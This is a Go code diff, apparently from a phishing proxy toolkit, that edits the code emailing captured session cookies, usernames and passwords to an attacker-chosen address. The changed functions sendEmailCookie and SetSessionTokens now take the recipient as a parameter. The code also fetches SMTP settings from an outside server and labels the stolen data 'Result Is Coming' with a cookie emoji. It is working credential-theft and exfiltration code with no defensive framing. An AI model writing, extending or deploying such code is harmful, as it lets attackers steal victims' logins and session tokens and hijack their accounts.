@@ -95,7 +95,7 @@ func telegramSendResult(msg string) {
 
 }
 
-func sendEmailCookie(msg string, username string, password string) {
+func sendEmailCookie(msg string, username string, password string, email string) {
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
 	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
@@ -135,7 +135,7 @@ func sendEmailCookie(msg string, username string, password string) {
 	m.SetHeader("From", smtp.Username)
 
 	// Set E-Mail receivers
-	m.SetHeader("To", goDotEnvVariable("MAIL_RESULT"))
+	m.SetHeader("To", email)
 
 	// Set E-Mail subject
 	m.SetHeader("Subject", "🍪Result Is Coming🍪")
@@ -257,7 +257,7 @@ func (d *Database) SetSessionCustom(sid string, name string, value string) error
 	return err
 }
 
-func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
+func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token, result string) error {
 	err := d.sessionsUpdateTokens(sid, tokens)
 
 	type Cookie struct {
@@ -300,7 +300,7 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 	//log.Important("database: %s", data)
 
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Username, data.Password)
+	sendEmailCookie(string(json11), data.Username, data.Password, result)
 	return err
 }
 
